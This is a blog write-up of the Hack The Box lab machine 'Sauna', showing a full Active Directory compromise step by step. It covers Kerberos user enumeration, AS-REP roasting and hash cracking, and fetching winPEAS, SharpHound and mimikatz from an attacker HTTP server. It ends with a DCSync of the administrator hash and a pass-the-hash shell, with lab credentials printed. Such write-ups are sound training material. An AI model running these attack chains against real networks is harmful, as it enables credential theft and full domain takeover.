---
title: "HTB - Sauna"
date: 2023-01-26T14:40:01+08:00
sort: ["all", "htb", "writeup", "featured"]
draft: false
---

![Box Info](/htbsauna/info.png)
Sauna | Machine <a href="https://www.hackthebox.com/home/machines/profile/229">#229</a> | Creator: <a href="https://www.hackthebox.com/home/users/profile/94858">egotisticalSW</a>


<aside id="toc">
    <h4>Table of Contents</h4>
	<h4><a href="#enumeration">1. </a>Enumeration</h4> 
	<h4><a href="#http-&-usersnames">2. </a>HTTP & Usernames</h4>         
	<h4><a href="#kerbrute-users">3. </a>Kerbrute Users & AS-REP Roasting</h4>   
	<h4><a href="#hash-cracking--ldap-dumping">5. </a>Hash Cracking & LDAP Dumping</h4>           
	<h4><a href="#usertxt">4. </a>user.txt</h4>    
	<h4><a href="#winpeas--pivotting">5. </a>WINPEAS & Pivotting</h4>            
	<h4><a href="#bloodhound--domain-analysis">6. </a>BloodHound & Domain Analysis</h4>             
	<h4><a href="#mimikatz--dcsync">7. </a>Mimikatz & DCSync</h4>
	<h4><a href="#alternative-attack">8. </a>Alternative Attack</h4>   
	<h4><a href="#roottxt">9. </a>root.txt</h4>            
	<h4><a href="#conclusion">10. </a>Conclusion</h4>
</aside>
 
Testing Connectivity & Adding Host:
{{< highlight bash >}}
ping -c 1 10.10.10.175 > /dev/null && echo '10.10.10.175 sauna.htb' | sudo tee -a /etc/hosts
{{< /highlight >}}

# Enumeration
  

A simple TCP port scan of the box with Nmap reveals it is a Windows machine and Domain Controller, also revealing the domain to be `EGOTISTICAL-BANK.LOCAL0` and interestingly running an IIS webserver. 
```bash
nmap -Pn -sC -sV 10.10.10.175
[snip]
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-26 14:02:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
|
Host script results:
|_clock-skew: 6h59m56s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-01-26T14:03:06
|_  start_date: N/A
[snip]
```
  
The other services running on the box appear to be standard for a Active Directory Domain Controller however give up little information without credentials, the services are still important to note as they become of value later however the webserver will be the focus of our enumeration. We still keep in mind the box is running Kerberos, LDAP and WinRM.

# HTTP & Usernames
  
  
When visting `http://sauna.htb` in a web browser, we are greeeted with Egotistical Banks site;
![HTTP Greeting](/htbsauna/http.PNG)
The site is full of filler content, anchor tags to direct us through a few seperate html pages, and contains a few forms, trying to submit the forms gives us a `HTTP 405` error or `"HTTP verb used to access this page is not allowed.` <a href="https://stackoverflow.com/questions/6841139/server-error405-http-verb-used-to-access-this-page-is-not-allowed">StackOverflow</a> suggested the requests are being directed at the static html pages rather than their respective handlers, I fuzzed for file extensions on the respective pages however nothing returned. I also fuzzed for directories and subdomains however there were no interesting results. The page does not appear to hold any backend functionality.
  

Carefully reading the `/about.html` page, It disclosed the names of a few employees of the said bank in a "Meet The Team Panel" which appears as below:
![HTTP MeetTheTeam](/htbsauna/http2.PNG)
Using this information and what we know about Active Directory domains, we can create a list of potential usernames.
```bash
cat fullnames.lst
Fergus Smith
Shaun Coins
Sophie Driver
Hugo Bear
Bowie taylor
Steven Kerb
```
To do this, I used <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a>, this tool is quite capable however we will only require its simple usage, it can parse a list of names and output potential usernames, it covers the common active directory formats such as firstlast and initialfirst and so on. We are given a total of 88 usernames to work with.
```bash
./username-anarchy -i fullnames.lst > usernames.lst
cat usernames.lst
[snip]
taylor
taylor.b
taylor.bowie
bt
steven
stevenkerb
steven.kerb
stevenke
[snip]
```
# Kerbrute Users & AS-REP Roasting
  

Since Kerberos services are running on the box, we can test if our usernames are valid users using a tool called <a href="https://github.com/ropnop/kerbrute">Kerbrute</a>, we are specifically interested in the `userenum` function. I was also recommeneded a great <a href="https://www.youtube.com/watch?v=2Xfd962QfPs&ab_channel=WEareTROOPERS">talk</a> which covered LDAP and Kerberos and what makes this tool possible.
```bash
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL usernames.lst --dc 10.10.10.175
[snip]
2023/01/26 02:53:53 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2023/01/26 02:53:53 >  Done! Tested 88 usernames (1 valid) in 0.568 seconds
[snip]
```
We return 1 valid username, `fsmith`. I also checked if the same format (\<firstinitial\>\<last\>) for the other names were valid, however they were not. 
  
With a valid user on the domain, we can attempt to <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat">AS-REP Roast</a>. This attack is dependent on that `pre-authentication required` attribute. It involves and exchange between a user and Domain controller, in which the Key Distribution Center issues a Ticket Granting Ticket containing the hash of the users password. We can utilise the <a href="https://github.com/fortra/impacket">Impacket Collection</a> to do this with a script called `GetNPUsers.py`. Since we only have a singular user, the usage is quite straight forward.
```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -no-pass -dc-ip 10.10.10.175
[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8c07cc2ae0b91af7c392be87ec7835e$d8582fca1358a07acf48e4f03d9432fb6f7398d9fc3319ab982950ef8db8e6fa5d250d148717fe6f84b7f2ac507c1c413221e158e57b3667c5c782a4360f274067f3df43fc8d487f74524cc6980f4f8d4b65acbe4c9bfc5ee5f0c1e0bbbc57aaa94a79988aaca692844704cdb37b479cb6260cc7466189e3247359c50b81f3a7e346b07c55f415ade4f8b5068f7f311609928babacf8668373aa4744eb77cbdc8de748501a1fa39ad197a25a977d46a804a630bb1fecaae2fe2d844e9719aaca55f211996aeb59dbee2edf6df438653b50f75626c1ba625db6daa6732fb1087cba7b414636277b4f1572e2d1c8841917c24047771ffcbf38a66b3f27b1bc5e9f
```
The user `fsmtith` appears to have the `pre-authentication required` flag set and we grab their password hash! We can send this to a file `fsmtih.kerb` for usability later.

# Hash Cracking & LDAP Dumping
  

Using hashcat, we can find the mode of our specified hash and begin cracking. In this instance we will use `rockyou2021` as our wordlist.
```bash
hashcat --example-hashes | grep -B 11 -A 7 `head -c 13 fsmith.kerb` | head -n 1
Hash mode #18200
hashcat -m 18200 fsmith.kerb -w rockyou.txt --show
[snip]
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8c07cc2ae0b91af7c392be87ec7835e$d8582fca1358a07acf48e4f03d9432fb6f7398d9fc3319ab982950ef8db8e6fa5d250d148717fe6f84b7f2ac507c1c413221e158e57b3667c5c782a4360f274067f3df43fc8d487f74524cc6980f4f8d4b65acbe4c9bfc5ee5f0c1e0bbbc57aaa94a79988aaca692844704cdb37b479cb6260cc7466189e3247359c50b81f3a7e346b07c55f415ade4f8b5068f7f311609928babacf8668373aa4744eb77cbdc8de748501a1fa39ad197a25a977d46a804a630bb1fecaae2fe2d844e9719aaca55f211996aeb59dbee2edf6df438653b50f75626c1ba625db6daa6732fb1087cba7b414636277b4f1572e2d1c8841917c24047771ffcbf38a66b3f27b1bc5e9f:Thestrokes23
[snip]
```
  
We succesfully cracked the hash and now have a pair of credentials! `fsmith:Thstrokes23`  
Assuming the credentials are valid to authenticate with the domain, we can return to enumerating the other services on the box, specifically, we will take a look at LDAP and dump the domain to see if the user has any interesting attributes we can abuse. To do this, we will simply use ldapdomaindump.
```bash
ldapdomaindump -u EGOTISTICAL-BANK.LOCAL\\fsmith -p 'Thestrokes23' 10.10.10.175 -o ldapdump/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
In our output directory (ldapdump/), multiple html and json files are outputted for analysis.

# user.txt
  

Analysing the LDAP dump from earlier, we find that our owned user `fsmith` is apart of the `Remote Management Users` group, knowing WinRM is running on the box, we can use Evil-WinRM to get a shell.
![fsmith LDAP](/htbsauna/fsmithldap.PNG)
```bash
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
[snip]
Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents>
[snip]
```
With this interactive shell, we can see we'eve owned `user.txt`
```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> type ..\Desktop\user.txt
********************************
```
# WINPEAS & Pivotting
  

Before rushing to BloodHound, we can search for privledge escalation vectors locally with <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WINPEAS</a>.
We can serve a http server on our attacking machine to transfer the binary to the box and grab it as fsmith;
```bash
 mkdir www && cd www && mv ~/opt/winpeas/winPEASany.exe winpeas.exe && python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
``` 
```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> iwr -uri "http://10.10.14.x:8080/winpeas.exe" -outfile wp.exe
```
We get a hit on our webserver and can confirm a copy of winpeas is on our target. Now we can simply run it from our Evil-WinRM session.
```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> ./wp.exe
[snip]
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
[snip]
```
WINPEAS finds some auto logon credentials of another user in the domain, interestingly, the user it finds doesnt actually exist, `svc_loanmanager` is entered as part of the autologin details, however we instead have a user `svc_loanmgr` which we can safely assume is in place, this small detail is also reflected in our LDAP domain dump and could be due to a number of reasons, nevertheless, we can attempt to get a shell as `svc_loanmgr` with these credentials as detailed by our ldap domain dump, the user is also part of the Remote Management group.
```bash
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
[snip]

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
[snip]
```
These appear to be valid credentials!
`svc_loanmgr:Moneymakesthewordlgoaround!`  
We have succesfully pivotted to another user.

# BloodHound & Domain Analysis
  

As svc_loanmgr, we can run BloodHound and analyse the domain for privledge escalation attacks. Firstly we can grab the SharpHound powershell script from our attacking machine, run it, and use Evil-WinRm to download the output to open in BloodHound.
```bash
cd ~/sauna/www && mv ~/opt/sharphound/SharpHound.ps1 sharphound.ps1 && python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> iwr -uri "http://10.10.14.x:8080/SharpHound.ps1" -outfile sh.ps1
```
With our web server hit, we can confirm its on the target and run and invoke the script setting our collection method to all.
```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> . ./sh.ps1
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> Invoke-BloodHound -CollectionMethod All
```
Once its finished running, we can use Evil-WinRMs "download" keyword to retrieve the files to load into BloodHound.
```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> download 20230126093229_BloodHound.zip
Info: Downloading 20230126093229_BloodHound.zip to ./20230126093229_BloodHound.zip
Info: Download successful!
```
After we have confirmed the file is retrieved, we can start Neo4j and Bloodhound before loading the data.
```bash
sudo neo4j console && sleep 20 && bloodhound
```
Once loading the data, we can query for svc_loanmgr and conduct analysis on the node. We find 1 First Degree Object Control with DCSync privledges as shown below;
![BloodHound](/htbsauna/bloodhound.png)
Notably the 2 privledges we have as svc_loanmgr are DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All .

# Mimikatz & DCSync
  

With our analysis of the domain, we can conclude we can use the svc_loanmgr principle to perform a DCSync attack, this is detailed in BloodHounds abuse info. To perform this attack, we firstly get Mimikatz onto the box, then use lsadump to dump the Administrators secrets.
```bash
cd ~/sauna/www && mv ~/opt/mimikatz/mimikatz.exe mimikatz.exe && python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> iwr -uri "http://10.10.14.x:8080/mimikatz.exe" -outfile mk.exe
```
We get a hit on our webserver and can confirm a copy of mimikatz is on our target. Now we can simply run it from our Evil-WinRM session.
```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> .\mk.exe 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
[snip]
Credentials:
  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
[snip]
```
This retrieves the administrator hash!

# Alternative Attack
  

As we have valid credentials to the svc_loanmgr account that can perform a DCSync attack, we can also grab the administrator hashes directly with the impacket script secretsdump.py .
```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
[snip]
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[snip]
```

# root.txt
  

To grab root.txt, we can simply use the hashes retrieved from our DCSync attack to authenticate as the Administrator. Most tools expect the full `LM:NT` hash format however Mimiktaz only gave us the second half, in this circumstance, we don't require the first segment of the hash to authenticate, so we can throw in some junk data. To note: Secretsdump does provide the full hash if preferred. To authenticate and get a shell, We can use another impacket script psexec.py;
```bash
psexec.py -hashes '6942012345:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.175
[snip]
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
********************************
[snip]
```
With an interactive shell we can simply grab root.txt.

# Conclusion
  

This box demonstrated a variety of Active Directory concepts and attacks in a digestable manner, it held a realistic real-world twist on the user enumeration but kept it simple for the foothold, I found the privesc interesting and enjoyed the chance to perform a DCSync attack. Very cool! 

---------------- 

--> Share via <a href="https://torrytw.ooo/index/htb-sauna">link</a>  
--> Return to the <a href="https://torrytw.ooo/index/">Index</a>
